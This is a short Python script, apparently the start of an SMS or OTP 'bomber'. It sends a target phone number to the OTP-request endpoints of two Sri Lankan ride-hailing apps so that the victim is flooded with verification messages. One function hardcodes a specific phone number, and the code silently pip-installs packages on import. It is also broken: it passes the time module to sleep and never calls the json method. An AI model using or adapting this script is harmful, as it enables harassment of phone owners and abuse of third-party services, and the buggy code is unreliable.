import time,os
try:
    from requests import post,get
except ModuleNotFoundError:
        print('\x1b[91m[!] Required Modules Aren\'t Installed!')
        time.sleep(1)
        print('\x1b[34m[*] Installing...')
        os.system('pip install requests colorama')
        print('\x1b[92m[+] Required Modules Installed!')
        from requests import post,get
def yogo(num,delay):
    url='http://app.yogotaxi.com/yogo_apps/passenger/v1/clientPinRequestData_droid.php'
    body={'countrycode':'94','mobile':num,'name':'santha','email':''}
    po=post(url,data=body)
    time.sleep(time)
def savari(num,delay):
    num = '0768772850'
    url='https://api.savarisrilanka.com/api/tenantIdNextTransportSLProd00001/users/signup-otp/request'
    body={'email':'a1@slt.net','numCountryCode':'+94','phoneNum':num[1:],'referralCode':'','userType':'passenger'}
    po=post(url,json=body)
    time.sleep(time)
    print(po.json)
